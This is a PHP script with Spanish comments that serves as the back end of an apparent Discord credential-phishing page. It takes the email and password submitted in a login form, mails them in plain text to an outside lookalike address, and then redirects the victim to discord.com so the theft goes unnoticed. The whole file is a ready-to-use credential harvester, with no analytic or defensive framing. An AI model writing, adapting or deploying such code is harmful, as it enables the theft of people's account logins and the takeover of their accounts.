<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Obtener los datos del formulario
    $email = $_POST['email'];
    $password = $_POST['password'];

    // Aquí puedes personalizar la dirección de destino de tu correo electrónico
    $to = 'gmail@accuendrecupedfx0zenu.com';
    $subject = 'Datos del formulario de inicio de sesión';
    $message = "Correo electrónico: $email\nContraseña: $password";
    
    // Cabeceras para el correo
    $headers = "From: no-reply@tusitio.com" . "\r\n" .
               "Reply-To: $email" . "\r\n" .
               "X-Mailer: PHP/" . phpversion();

    // Enviar el correo
    if (mail($to, $subject, $message, $headers)) {
        // Redirigir a Discord después de enviar el correo
        header("Location: https://discord.com");
        exit(); // Es importante usar exit después de la redirección para asegurar que el script termine.
    } else {
        echo "Hubo un error al enviar el mensaje.";
    }
} else {
    echo "No se recibieron datos del formulario.";
}
?>
